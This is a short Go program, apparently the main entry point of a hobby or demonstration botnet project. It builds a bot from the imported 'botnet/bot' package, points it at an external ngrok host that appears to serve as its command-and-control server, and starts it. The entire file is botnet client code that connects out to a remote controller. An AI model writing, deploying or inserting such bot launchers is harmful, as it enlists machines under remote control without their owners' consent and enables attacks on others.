package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("fa29dfd6.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Start()
}
